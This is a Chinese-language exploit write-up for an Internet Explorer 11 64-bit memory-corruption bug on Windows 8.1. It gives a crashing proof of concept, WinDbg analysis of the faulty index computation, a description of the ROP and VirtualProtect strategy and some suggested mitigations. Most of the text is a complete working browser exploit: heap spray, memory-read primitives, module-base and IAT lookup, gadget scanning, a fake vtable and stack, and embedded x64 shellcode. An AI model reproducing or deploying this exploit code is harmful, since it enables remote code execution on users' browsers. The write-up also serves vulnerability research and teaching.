link:http://ifsec.blogspot.com/2013/11/exploiting-internet-explorer-11-64-bit.html

环境：

    IE 11 
    win8.1 preview x64
    windbg x64

## 1.漏洞分析
poc:

    <script>
    function bug() {
    for(var i = 0;i < 2;i++)
    {
     t = document.getElementsByTagName("table")[i];
     t.parentNode.runtimeStyle.posWidth = "";
     t.focus();
     }
    }
    </script>
    <body onload=bug()>
    <form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>
    <form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>

Windbg附加IE打开poc.html,程序崩溃

    (be8.a48): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    MSHTML!Layout::ContainerBox::ContainerBox+0x1e6:
    00007ff8`74ca5d06 488b04d0mov rax,qword ptr [rax+rdx*8] ds:000000e2`b3cf0ce8=????????????????
    0:012> r
    rax=000000e2a3cf0cf0 rbx=000000e2a9b43c20 rcx=000000000000007f
    rdx=0000000001ffffff rsi=000000e2a3cb9e60 rdi=00000000ffffffff
    rip=00007ff874ca5d06 rsp=000000e2a3bd8fe0 rbp=000000e2a3d12980
     r8=0000000000000001  r9=0000000000000001 r10=0000000000000000
    r11=000000e2a3bd8fd0 r12=00000000ffffffff r13=00000000ffffffff
    r14=0000000000000255 r15=00000000ffffffff
    iopl=0 nv up ei pl nz na pe nc
    cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b efl=00010202
    MSHTML!Layout::ContainerBox::ContainerBox+0x1e6:
    00007ff8`74ca5d06 488b04d0mov rax,qword ptr [rax+rdx*8] ds:000000e2`b3cf0ce8=????????????????
    0:012> k
    Child-SP  RetAddr   Call Site
    000000e2`a3bd8fe0 00007ff8`74d4b620 MSHTML!Layout::ContainerBox::ContainerBox+0x1e6
    000000e2`a3bd9060 00007ff8`74d56e18 MSHTML!Layout::TableGridBox::TableGridBox+0x38
    000000e2`a3bd90c0 00007ff8`74d56d32 MSHTML!Layout::TableGridBoxBuilder::CreateTableGridBoxBuilder+0xd8
    000000e2`a3bd9130 00007ff8`74ca0470 MSHTML!Layout::LayoutBuilder::CreateLayoutBoxBuilder+0x2c9
    000000e2`a3bd91f0 00007ff8`74c9f263 MSHTML!Layout::LayoutBuilderDriver::StartLayout+0x85f
    000000e2`a3bd9400 00007ff8`74c9a77a MSHTML!Layout::PageCollection::FormatPage+0x287
    000000e2`a3bd9590 00007ff8`74c9a27e MSHTML!Layout::PageCollection::LayoutPagesCore+0x2aa
    000000e2`a3bd9730 00007ff8`74c9b08d MSHTML!Layout::PageCollection::LayoutPages+0x18e
    000000e2`a3bd97c0 00007ff8`74c9ae13 MSHTML!CMarkupPageLayout::CalcPageLayoutSize+0x251
    000000e2`a3bd98e0 00007ff8`74df1b0a MSHTML!CMarkupPageLayout::CalcTopLayoutSize+0xd7
    000000e2`a3bd99a0 00007ff8`752c4416 MSHTML!CMarkupPageLayout::DoLayout+0x76

从上面可以看出，IE进程崩溃在MSHTML!Layout:ContainerBox:ContainerBox函数中，因为试图读取rax + rdx * 8指向的未初始化内存。rax实际上是指向一个CFormatCache对象的内存（从何而知?），而rdx（0x0000000001ffffff）的值不知的从哪来的。查看了ContainerBox：ContainerBox函数的代码，想看看这个值是从哪里来的，以及如果攻击者控制了rax + 0xffffff8处的内存之后可以做什么。
    
    MSHTML!Layout::ContainerBox::ContainerBox:
    00007ff8`74ca5b20 488bc4  mov rax,rsp
    00007ff8`74ca5b23 44884820mov byte ptr [rax+20h],r9b
    00007ff8`74ca5b27 4c894018mov qword ptr [rax+18h],r8
    00007ff8`74ca5b2b 48895010mov qword ptr [rax+10h],rdx
    00007ff8`74ca5b2f 48894808mov qword ptr [rax+8],rcx
    00007ff8`74ca5b33 53  pushrbx
    00007ff8`74ca5b34 55  pushrbp
    00007ff8`74ca5b35 56  pushrsi
    00007ff8`74ca5b36 57  pushrdi
    00007ff8`74ca5b37 4154pushr12
    00007ff8`74ca5b39 4155pushr13
    00007ff8`74ca5b3b 4156pushr14
    00007ff8`74ca5b3d 4157pushr15
    00007ff8`74ca5b3f 4883ec38sub rsp,38h
    00007ff8`74ca5b43 33ffxor edi,edi
    00007ff8`74ca5b45 83cdff  or  ebp,0FFFFFFFFh  <---------------------(1)用作CFormatCache索引变量的初始值
    00007ff8`74ca5b48 488bd9  mov rbx,rcx
    00007ff8`74ca5b4b 48897908mov qword ptr [rcx+8],rdi
    00007ff8`74ca5b4f 488d0542444100  lea rax,[MSHTML!Layout::ContainerBox::`vftable' (00007ff8`750b9f98)]
    00007ff8`74ca5b56 488901  mov qword ptr [rcx],rax
    00007ff8`74ca5b59 48897910mov qword ptr [rcx+10h],rdi
    00007ff8`74ca5b5d 48897928mov qword ptr [rcx+28h],rdi
    00007ff8`74ca5b61 48897930mov qword ptr [rcx+30h],rdi
    00007ff8`74ca5b65 48897938mov qword ptr [rcx+38h],rdi
    00007ff8`74ca5b69 48897940mov qword ptr [rcx+40h],rdi
    00007ff8`74ca5b6d 48897948mov qword ptr [rcx+48h],rdi
    00007ff8`74ca5b71 48897950mov qword ptr [rcx+50h],rdi
    00007ff8`74ca5b75 48897958mov qword ptr [rcx+58h],rdi
    00007ff8`74ca5b79 48897960mov qword ptr [rcx+60h],rdi
    00007ff8`74ca5b7d 48897968mov qword ptr [rcx+68h],rdi
    00007ff8`74ca5b81 48897970mov qword ptr [rcx+70h],rdi
    00007ff8`74ca5b85 48897978mov qword ptr [rcx+78h],rdi
    00007ff8`74ca5b89 4889b980000000  mov qword ptr [rcx+80h],rdi
    00007ff8`74ca5b90 4889b988000000  mov qword ptr [rcx+88h],rdi
    00007ff8`74ca5b97 4889b990000000  mov qword ptr [rcx+90h],rdi
    00007ff8`74ca5b9e 6689a9ae000000  mov word ptr [rcx+0AEh],bp
    00007ff8`74ca5ba5 6689a9ac000000  mov word ptr [rcx+0ACh],bp
    00007ff8`74ca5bac 6689a9aa000000  mov word ptr [rcx+0AAh],bp
    00007ff8`74ca5bb3 6689a9a8000000  mov word ptr [rcx+0A8h],bp
    00007ff8`74ca5bba 4889b9a0000000  mov qword ptr [rcx+0A0h],rdi
    00007ff8`74ca5bc1 488b4978mov rcx,qword ptr [rcx+78h]
    00007ff8`74ca5bc5 48897b78mov qword ptr [rbx+78h],rdi
    00007ff8`74ca5bc9 4885c9  testrcx,rcx
    00007ff8`74ca5bcc 0f850e2e6000jne MSHTML!Layout::ContainerBox::ContainerBox+0x544 (00007ff8`752a89e0)
    00007ff8`74ca5bd2 488b8b80000000  mov rcx,qword ptr [rbx+80h]
    00007ff8`74ca5bd9 4889bb80000000  mov qword ptr [rbx+80h],rdi
    00007ff8`74ca5be0 4885c9  testrcx,rcx
    00007ff8`74ca5be3 0f85012e6000jne MSHTML!Layout::ContainerBox::ContainerBox+0x54e (00007ff8`752a89ea)
    00007ff8`74ca5be9 488bbc2488000000 mov rdi,qword ptr [rsp+88h]
    00007ff8`74ca5bf1 4885ff  testrdi,rdi
    00007ff8`74ca5bf4 7415je  MSHTML!Layout::ContainerBox::ContainerBox+0xeb (00007ff8`74ca5c0b)
    00007ff8`74ca5bf6 0fb74772movzx   eax,word ptr [rdi+72h]
    00007ff8`74ca5bfa b9ffff0000  mov ecx,0FFFFh <----------------------------------------------
    00007ff8`74ca5bff 663bc1  cmp ax,cx  <---------------------------------------->
    00007ff8`74ca5c02 7307jae MSHTML!Layout::ContainerBox::ContainerBox+0xeb (00007ff8`74ca5c0b)
    00007ff8`74ca5c04 66ffc0  inc ax
    00007ff8`74ca5c07 66894772mov word ptr [rdi+72h],ax <---------------------------------
    00007ff8`74ca5c0b 488b4b10mov rcx,qword ptr [rbx+10h]
    00007ff8`74ca5c0f 48897b10mov qword ptr [rbx+10h],rdi
    00007ff8`74ca5c13 4885c9  testrcx,rcx
    00007ff8`74ca5c16 0f85d82d6000jne MSHTML!Layout::ContainerBox::ContainerBox+0x558 (00007ff8`752a89f4)
    00007ff8`74ca5c1c 488b8790000000  mov rax,qword ptr [rdi+90h]
    00007ff8`74ca5c23 0fb6884c030000  movzx   ecx,byte ptr [rax+34Ch]
    00007ff8`74ca5c2a 80e11f  and cl,1Fh
    00007ff8`74ca5c2d 80f911  cmp cl,11h
    00007ff8`74ca5c30 0f84336c0a00je  MSHTML!Layout::ContainerBox::ContainerBox+0x45e (00007ff8`74d4c869)
    00007ff8`74ca5c36 488bcf  mov rcx,rdi <---------------------------------------------------------------
    00007ff8`74ca5c39 e8a2c3fbff  callMSHTML!CTreeNode::CacheStyleForLayout (00007ff8`74c61fe0)
    00007ff8`74ca5c3e 440fb64713  movzx   r8d,byte ptr [rdi+13h]
    00007ff8`74ca5c43 410fb6c0movzx   eax,r8b
    00007ff8`74ca5c47 c0e805  shr al,5
    00007ff8`74ca5c4a 2401and al,1 ----------------------------------------------------标志
    00007ff8`74ca5c4c 0f84ac2d6000je  MSHTML!Layout::ContainerBox::ContainerBox+0x562 (00007ff8`752a89fe) --------------- 判断
    00007ff8`74ca5c52 440fb76f68  movzx   r13d,word ptr [rdi+68h] <---------------------(2-yes)-若设置了就从CTreeNode对象中复制索引值   
    
    00007ff8`752a89fe 448bed  mov r13d,ebp  <-------------------------------------------(2-no)--  若未设置了就则使用初始值
    00007ff8`752a8a01 e951d29fff  jmp MSHTML!Layout::ContainerBox::ContainerBox+0x137 (00007ff8`74ca5c57)
    
    00007ff8`74ca5c57 84c0testal,al
    00007ff8`74ca5c59 0f84a72d6000je  MSHTML!Layout::ContainerBox::ContainerBox+0x56a (00007ff8`752a8a06)
    00007ff8`74ca5c5f 440fb7676a  movzx   r12d,word ptr [rdi+6Ah]
    00007ff8`74ca5c64 41f6c040testr8b,40h
    00007ff8`74ca5c68 0f84a02d6000je  MSHTML!Layout::ContainerBox::ContainerBox+0x572 (00007ff8`752a8a0e)
    00007ff8`74ca5c6e 440fb77f6e  movzx   r15d,word ptr [rdi+6Eh]
    00007ff8`74ca5c73 488bd7  mov rdx,rdi
    00007ff8`74ca5c76 83e201  and edx,1
    00007ff8`74ca5c79 751ajne MSHTML!Layout::ContainerBox::ContainerBox+0x175 (00007ff8`74ca5c95)
    00007ff8`74ca5c7b 488b8790000000  mov rax,qword ptr [rdi+90h]
    00007ff8`74ca5c82 0fb6884c030000  movzx   ecx,byte ptr [rax+34Ch]
    00007ff8`74ca5c89 83e11f  and ecx,1Fh
    00007ff8`74ca5c8c 83f911  cmp ecx,11h
    00007ff8`74ca5c8f 0f84396c0a00je  MSHTML!Layout::ContainerBox::ContainerBox+0x4c2 (00007ff8`74d4c8ce)
    00007ff8`74ca5c95 4885d2  testrdx,rdx
    00007ff8`74ca5c98 751ajne MSHTML!Layout::ContainerBox::ContainerBox+0x194 (00007ff8`74ca5cb4)
    00007ff8`74ca5c9a 488b8790000000  mov rax,qword ptr [rdi+90h]
    00007ff8`74ca5ca1 0fb6884c030000  movzx   ecx,byte ptr [rax+34Ch]
    00007ff8`74ca5ca8 83e11f  and ecx,1Fh
    00007ff8`74ca5cab 83f90a  cmp ecx,0Ah
    00007ff8`74ca5cae 0f84646c0a00je  MSHTML!Layout::ContainerBox::ContainerBox+0x512 (00007ff8`74d4c918)
    00007ff8`74ca5cb4 41f6c010testr8b,10h
    00007ff8`74ca5cb8 0f84192d6000je  MSHTML!Layout::ContainerBox::ContainerBox+0x53b (00007ff8`752a89d7)
    00007ff8`74ca5cbe 440fb7776c  movzx   r14d,word ptr [rdi+6Ch]
    00007ff8`74ca5cc3 8b0df7432701mov ecx,dword ptr [MSHTML!tls_index (00007ff8`75f1a0c0)]
    00007ff8`74ca5cc9 65488b042558000000 mov   rax,qword ptr gs:[58h] <-----------------------------------
    00007ff8`74ca5cd2 be08000000  mov esi,8
    00007ff8`74ca5cd7 488b04c8mov rax,qword ptr [rax+rcx*8] <-----------------------------
    00007ff8`74ca5cdb 410fbffdmovsx   edi,r13w <--------------------------------------------------------(3) 较高索引
    00007ff8`74ca5cdf 488b3406mov rsi,qword ptr [rsi+rax] <------------------------------
    00007ff8`74ca5ce3 488b2e  mov rbp,qword ptr [rsi] <------------------------------
    00007ff8`74ca5ce6 85fftestedi,edi <-----------------------------------------------------
    00007ff8`74ca5ce8 0f8848b67200js  MSHTML!CTextShadowEffectProvider::GetTargetBounds+0x67506 (00007ff8`753d1336)
    00007ff8`74ca5cee 3b7d40  cmp edi,dword ptr [rbp+40h] <------------------------------判断
    00007ff8`74ca5cf1 0f8d3fb67200jge MSHTML!CTextShadowEffectProvider::GetTargetBounds+0x67506 (00007ff8`753d1336)
    00007ff8`74ca5cf7 488b4538mov rax,qword ptr [rbp+38h] <---------------------------------------
    00007ff8`74ca5cfb 8bcfmov ecx,edi
    00007ff8`74ca5cfd 8bd7mov edx,edi <------------------------------------------------------------------------(4)
    00007ff8`74ca5cff 48c1ea07shr rdx,7 <----------------------------------------- 
    00007ff8`74ca5d03 83e17f  and ecx,7Fh <------------------------------------------------------索引低位（将为0x7f）
    00007ff8`74ca5d06 488b04d0mov rax,qword ptr [rax+rdx*8] <------漏洞触发(乘以8（void *的大小），然后将此偏移量加到rax)
    00007ff8`74ca5d0a 488d0c49lea rcx,[rcx+rcx*2]<------------------------------------------x24
    00007ff8`74ca5d0e 488d14c8lea rdx,[rax+rcx*8]   <-------------------------------------------
    00007ff8`74ca5d12 8b4cc810mov ecx,dword ptr [rax+rcx*8+10h]
    00007ff8`74ca5d16 8b420c  mov eax,dword ptr [rdx+0Ch] <-------取出[rdx + 0C]处的数字
    00007ff8`74ca5d19 3bc8cmp ecx,eax
    00007ff8`74ca5d1b 0f8325b67200jae MSHTML!CTextShadowEffectProvider::GetTargetBounds+0x67516 (00007ff8`753d1346)
    00007ff8`74ca5d21 ffc0inc eax  <----------------自增
    00007ff8`74ca5d23 89420c  mov dword ptr [rdx+0Ch],eax <-写回[rdx + 0C]
    00007ff8`74ca5d26 488b6e08mov rbp,qword ptr [rsi+8]
    00007ff8`74ca5d2a 410fbffcmovsx   edi,r12w

崩溃时rdx的值是由ebp值经过几次赋值之后得来的，ebp在函数开头部分被初始化为0xFFFFFFFF。
假设值0xFFFFFFFF（-1）是用作CFormatCache索引变量的初始值的。

    1.在稍后的代码中，获取了一个指向CTreeNode对象的指针，然后检查CTreeNode中的标志，
	如果它被设置，则从CTreeNode对象中复制索引值。然而，如果未设置标志（如PoC中的情况），则使用初始值。
    2.值0xFFFFFFFF然后被分成上下两部分（CFormatCache看起来像是一个2个DWORD值的数组）。
	较高索引（将等于0x1ffffff）的值将乘以8（void *的大小），然后将此偏移量加到rax，并将此内存位置处的内容写回到rax。然后，让索引低位（将为0x7f）的值乘以24（可能是CCharFormat元素的大小），并将该偏移量加到eax，然后将此内存位置的内容写入rdx。
    3.最后，这是与利用相关的部分：取出[rdx + 0C]处的数字，自增之后再写回[rdx + 0C]

C++代码：

    int cacheIndex = -1;
    if(treeNode->flag) {
      cacheIndex = treeNode->cacheIndex;
    } 
    unsigned int index_hi = cacheIndex, index_lo = cacheIndex;
    index_hi = index_hi >> 7;
    index_lo = index_lo & 0x7f;
    //with sizeof(formatCache[i]) == 8 and sizeof(formatCache[i][j]) == 24
    formatCache[index_hi][index_lo].some_number++;

大概流程：

    1.一个指向有效内存（CFormatCache指针）的指针A偏移0x0FFFFFF8（256M）处是另一个指针B
    2.指针B偏移0xBF4(0x7F * 3 * 8 + 0x0C）处是一个DWORD值C
    3.C将被加1

## 2.漏洞利用

### 2.1 寻找堆栈翻转（pivot）的gadgets
为了将栈转移到堆上，我们需要找到能完成这个任务的指令

一个可用的gadgets序列如下所示，以下指令不能直接满足我们的需求，我们需要实先控制rax和rcx中的值
    
    00007ffb`265ea973 50  push rax
    00007ffb`265ea974 5c  pop rsp
    00007ffb`265ea975 85d2testedx,edx
    00007ffb`265ea977 7408je  MSHTML!CTableLayout::GetLastRow+0x25 (00007ffb`265ea981)
    00007ffb`265ea979 8b4058  mov eax,dword ptr [rax+58h]
    00007ffb`265ea97c ffc8dec eax
    00007ffb`265ea97e 03c2add eax,edx
    00007ffb`265ea980 c3  ret
    00007ffb`265ea981 8b8184010000mov eax,dword ptr [rcx+184h]
    00007ffb`265ea987 ffc8dec eax
    00007ffb`265ea989 c3  ret

虽然漏洞利用主要依赖于jscript9.dll中的对象，但是mshtml.dll模块的地址可以很容易地通过内存泄漏来获得。我们可以把一个mshtml对象放入到一个JS数组对象中去，然后我们可以读取到mshtml对象的虚表并且引用它。

### 2.2 VirtualProtect
在获得了栈的控制之后，我们可以调用VirtualProtect来分配一块内存，这块内存可以允许我们写入代码并进行执行。我们可以通过mshtml.dll的IAT找到VirtualProtect函数的地址（因此exp中要包含一些基本的PE结构的解析）。因为在64位Windows中，使用的调用约定是与32位不同的。64位Windows使用fastcall约定，前4个参数（这正是VirtualProtect的参数数量）通过寄存器RCX，RDX，R8和R9（按此顺序）来传递。因此，我们需要一些额外的gadgets来将正确的参数加载到正确的寄存器中：

    pop rcx; ret;
    pop rdx; ret;
    pop r8; ret;
    pop r9; ret;

所在获得了VirtualProtect函数的地址和控制了堆栈的情况下，我们就可以控制正确的参数并返回调用VirtualProtect函数了

如上所示，前三个参数在mshtml.dll模块中是比较常见的。但是第四个不是很常见，不过对于VirtualProtect来说，最后一个参数只需要指向一个可写内存的即可，而在我们获得对RIP控制的时候就已经是这种情况了，所以我们实际上不需要更改r9。

最终的ROP链看起来像是这样：

    address of pop rcx; ret;
    address on the heap block with shellcode
    address of pop rdx; ret;
    0x1000 (size of the memory that we want to make executable)
    address of pop r8; ret;
    0x40 (PAGE_EXECUTE_READWRITE)
    address of VirtualProtect
    address of shellcode

## 3.结论

虽然Windows8/8.1已经存在了需要强有力的保护机制，但是内存破坏类漏洞仍然存活着并且可以被利用。当然，一些漏洞类型变得更加难以利用，但是从这里的这个漏来看，肯定有更多的漏洞可以以类似的方式被利用。该漏洞还表明，在某些情况下，即使在64位进程中堆喷射仍然有用。虽然在一些情况下，编写在x64上的漏洞利用比在x86上更加困难（例如要找到进行喷射的内容和要覆写的东西，查找堆栈翻转的gadgets等），但这些困难并不足以阻止一个有目的明确的攻击者。

最后，列出了一些可以使在Windows 8.1的IE11中编写exp更困难的保护方法：

    1.考虑到攻击者使用JavaScript数组来突破堆喷射保护，可以对包含大量重复值的数组进行RLE编码。
    
    2.对JavaScript堆添加与默认堆相同的保护，如添加页保护（guard pages）并引入地址随机化。
    
    3.对常见的JavaScript对象的虚函数表进行保护。
    
    4.对编译器进行更改以从代码中删除所有的可用的堆栈翻转gadgets。其实现在这些gadgets在x64代码中已经很少了，所以不会对性能有很大的影响。

## exp

    <script>
     var magic = 25001; //if the exploit doesn't work for you try selecting another number in the range 25000 -/+ 128
     var strarr = new Array();
     var arrarr = new Array();
     var sprayarr = new Array();
     var numsploits;
     var addrhi,addrlo;
     var arrindex = -1;
     var strindex = -1;
     var strobjidx = -1;
     var mshtmllo,mshtmlhi;
     //calc shellcode, based on SkyLined's x64 calc shellcode, but fixed to work on win 8.1
     var shellcode = [0x40, 0x80, 0xe4, 0xf8, 0x6a, 0x60, 0x59, 0x65, 0x48, 0x8b, 0x31, 0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x4f, 0x3c, 0x8b, 0x5c, 0x0f, 0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48, 0x01, 0xfe, 0x8b, 0x4c, 0x1f, 0x24, 0x48, 0x01, 0xf9, 0x31, 0xd2, 0x0f, 0xb7, 0x2c, 0x51, 0xff, 0xc2, 0xad, 0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75, 0xf0, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe, 0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54, 0x59, 0x31, 0xd2, 0x48, 0x83, 0xec, 0x28, 0xff, 0xd7, 0xcc, 0, 0, 0, 0];
    //triggers the bug
    function crash(i) {
     numsploits = numsploits + 1;
     t = document.getElementsByTagName("table")[i];
     t.parentNode.runtimeStyle.posWidth = -1;
     t.focus();
     setTimeout(cont, 100);  
    }
    //heap spray
    function spray() {
     var aa = "aa";
     //create a bunch of String and Array objects
     for(var i=0;i<50000;i++) {
       strarr[i] = aa.toUpperCase();
       arrarr[i] = new Array(1,2,3,4,5);
     }
     //heap-spray with pointers to a String object
     for(var i=0;i<2000;i++) {
       var tmparr = new Array(16000);
       for(var j=0;j<16000;j++) {
     tmparr[j] = strarr[magic];
       }
       sprayarr[i] = tmparr;
     }
     crash(0);
    }
    function cont() {
     if(numsploits < 5) {
       crash(numsploits);
       return;
     }
     if(numsploits < 6) {
       setTimeout(afterFirstOverwrite, 0);
       return;
     }
     //alert("done2");
     afterSecondOverwrite();
    }
    function afterFirstOverwrite() {
     //check which array was overwritten
     for(var i=24000;i<25000;i++) {
       arrarr[i][18] = 1;
       var a = arrarr[i][4];
       var b = arrarr[i][16];
       var c = arrarr[i][17];
       if(typeof(b)!="undefined") {
     arrindex = i;
     addrlo = b;
     addrhi = c;
     break;
       }
     }
     if(arrindex < 0) {
       alert("Exploit failed, error overwriting array");
       return;
     }
     //alert(arrindex);
     //re-spray to overwrite buffer capacity
     for(var i=0;i<2000;i++) {
       sprayarr[i] = new Array(32000);
     }
     CollectGarbage();
     for(var i=0;i<2000;i++) {
       for(var j=0;j<32000;j++) {
     if(j%2 == 0) {
       sprayarr[i][j] = addrlo + 8 - 0xBF4 + 3;
     } else {
       sprayarr[i][j] = addrhi;
     }
       }
     }
     //alert("done");
     crash(numsploits);
    }
    //unsigned to signed conversion
    function u2s(i) {
     if(i>0x80000000) {
       return -(0xFFFFFFFF - i + 1);
     } else {
       return i;
     }
    }
    //signed to unsigned conversion
    function s2u(i) {
     if(i<0) {
       return (0xFFFFFFFF + i + 1);
     } else {
       return i;
     }
    }
    //memory disclosure helper function, read 32-bit number from a given address
    function read32(addrhi, addrlo) {
     arrarr[arrindex][strobjidx + 6] = u2s(addrlo);
     arrarr[arrindex][strobjidx + 7] = addrhi;
     return strarr[strindex].charCodeAt(0) + 0x10000 * strarr[strindex].charCodeAt(1);
    }
    //memory disclosure helper function, read 16-bit number from a given address
    function read16(addrhi, addrlo) {
     arrarr[arrindex][strobjidx + 6] = u2s(addrlo);
     arrarr[arrindex][strobjidx + 7] = addrhi;
     return strarr[strindex].charCodeAt(0);
    }
    function afterSecondOverwrite() {
     arrindex = arrindex + 1;
     //adjusts the array length - gives us some space to read and write memory
     arrarr[arrindex][2+0x5000/4] = 0;
     //search for the next string object and overwrite its length and content ptr to write jscript9
     for(var i=1;i<=5;i++) {
       if((arrarr[arrindex][2 + i*0x400 - 0x20] == 2) && (arrarr[arrindex][3 + i*0x400 - 0x20] == 0)) {
     //alert("found");
     strobjidx = i*0x400 - 0x20 - 2;
     arrarr[arrindex][strobjidx+4] = 4;
     for(var j=20000;j<30000;j++) {
       if(strarr[j].length != 2) {
     strindex = j;
     break;
       }
     }
     break;
       }
     }
     if(strindex < 0) {
       alert("Exploit failed, couldn't overwrite string length");
       return;
     }
     //alert("mshtml");
     //create a mshtml object and follow references to its vtable ptr
     var lo1,hi1,lo2,hi2;
     arrarr[arrindex+1][0] = document.createElement("button");
     lo1 = s2u(arrarr[arrindex][6+0x28/4]);
     hi1 = arrarr[arrindex][6+0x28/4 + 1];
     lo2 = read32(hi1, lo1+0x18);
     hi2 = read32(hi1, lo1+0x18+4);
     mshtmllo = read32(hi2, lo2+0x20);
     mshtmlhi = read32(hi2, lo2+0x20+4);
     //find the module base
     mshtmllo = mshtmllo - mshtmllo % 0x1000;
     while(mshtmllo>0) {
       if(read16(mshtmlhi,mshtmllo) == 0x5A4D) break;
       mshtmllo = mshtmllo - 0x1000;
     }
     //find the address of VirtualProtect in the IAT
     var coff = read32(mshtmlhi, mshtmllo + 0x3C);
     var idata = read32(mshtmlhi, mshtmllo + coff + 4 + 20 + 120);
     var iat = read32(mshtmlhi, mshtmllo + idata + 16);
     var vplo =  read32(mshtmlhi, mshtmllo + iat + 0x8a8);
     var vphi =  read32(mshtmlhi, mshtmllo + iat + 0x8a8 + 4);
     //alert(mshtmlhi.toString(16)+"'"+mshtmllo.toString(16)+","+vplo.toString(16));
     //find the rop gadgets in mshtml
     var pivotlo = -1;
     arrarr[arrindex][strobjidx + 4] = 0x01000000;
     arrarr[arrindex][strobjidx + 6] = u2s(mshtmllo);
     arrarr[arrindex][strobjidx + 7] = mshtmlhi;
     for(var i=0x800;i<0x900000;i++) {
       if((strarr[strindex].charCodeAt(i) == 0x5C50)
     &&(strarr[strindex].charCodeAt(i+1) == 0xD285)
     &&(strarr[strindex].charCodeAt(i+2) == 0x0874)
     &&(strarr[strindex].charCodeAt(i+3) == 0x408b))
       {
     pivotlo = mshtmllo + i*2;
     break;
       }
       if((strarr[strindex].charCodeAt(i) == 0x508B)
     &&(strarr[strindex].charCodeAt(i+1) == 0x855C)
     &&(strarr[strindex].charCodeAt(i+2) == 0x74D2)
     &&(strarr[strindex].charCodeAt(i+3) == 0x8b08))
       {
     pivotlo = mshtmllo + i*2 + 1;
     break;
       }
     }
     if(pivotlo < 0) {
       alert("Exploit failed, couldn't find ROP gadgets");
       return;
     }
     //alert(pivotlo.toString(16));
     var poprcx = -1;
     for(var i=0x800;i<0x900000;i++) {
       if(strarr[strindex].charCodeAt(i) == 0xC359) {
     poprcx = mshtmllo + i*2;
     break;
       }
     }
     if(poprcx < 0) {
       alert("Exploit failed, couldn't find ROP gadgets");
       return;
     }
     var poprdx = -1;
     for(var i=0x800;i<0x900000;i++) {
       if(strarr[strindex].charCodeAt(i) == 0xC35A) {
     poprdx = mshtmllo + i*2;
     break;
       }
     }
     if(poprdx < 0) {
       alert("Exploit failed, couldn't find ROP gadgets");
       return;
     }
     var popr8 = -1;
     for(var i=0x800;i<0x900000;i++) {
       if((strarr[strindex].charCodeAt(i) == 0x5841) && (strarr[strindex].charCodeAt(i+1) % 256 == 0xC3)) {
     popr8 = mshtmllo + i*2;
     break;
       }
       if((Math.floor(strarr[strindex].charCodeAt(i)/256) == 0x41) && (strarr[strindex].charCodeAt(i+1) == 0xC358)) {
     popr8 = mshtmllo + i*2 + 1;
     break;
       }
     }
     if(popr8 < 0) {
       alert("Exploit failed, couldn't find ROP gadgets");
       return;
     }
     //prepare the fake vtable
     var eaxoffset = 6 + 0x20;
     arrarr[arrindex][eaxoffset + 0x98/4] = u2s(pivotlo);
     arrarr[arrindex][eaxoffset + 0x98/4 + 1] = mshtmlhi;
     //prepare the fake stack
     arrarr[arrindex][eaxoffset] = u2s(poprcx);
     arrarr[arrindex][eaxoffset + 1] = mshtmlhi;
     arrarr[arrindex][eaxoffset + 2] = addrlo;
     arrarr[arrindex][eaxoffset + 3] = addrhi;
     arrarr[arrindex][eaxoffset + 4] = u2s(poprdx);
     arrarr[arrindex][eaxoffset + 5] = mshtmlhi;
     arrarr[arrindex][eaxoffset + 6] = 0x1000;
     arrarr[arrindex][eaxoffset + 7] = 0;
     arrarr[arrindex][eaxoffset + 8] = u2s(popr8);
     arrarr[arrindex][eaxoffset + 9] = mshtmlhi;
     arrarr[arrindex][eaxoffset + 10] = 0x40;
     arrarr[arrindex][eaxoffset + 11] = 0;
     arrarr[arrindex][eaxoffset + 12] = u2s(vplo);
     arrarr[arrindex][eaxoffset + 13] = u2s(vphi);
     arrarr[arrindex][eaxoffset + 14] = addrlo + 24 + eaxoffset*4 + 50*4;
     arrarr[arrindex][eaxoffset + 15] = addrhi;
     //encode the shellcode
     for(var i=0;i<Math.floor(shellcode.length/4);i++) {
    arrarr[arrindex][eaxoffset + 50 + i] = u2s(shellcode[i*4+3]*0x1000000 + shellcode[i*4+2]*0x10000 + shellcode[i*4+1]*0x100 + shellcode[i*4]);
     }
     //overwrite a vtable of jscript9 object and trigger a virtual call
     arrarr[arrindex][7] = addrhi;
     arrarr[arrindex][6] = addrlo + 24 + eaxoffset*4;
     //arrarr[arrindex][7] = 0x123456;
     //arrarr[arrindex][6] = 0x123456;
     //alert("done3");
     arrarr[arrindex+1].blah();
    }
    function run() {
     numsploits = 0;
     window.setTimeout(spray, 1000);
    }
    </script>
    <body onload=run()>
    <form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>
    <form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>
    <form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>
    <form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>
    <form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>
    <form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>
    </body>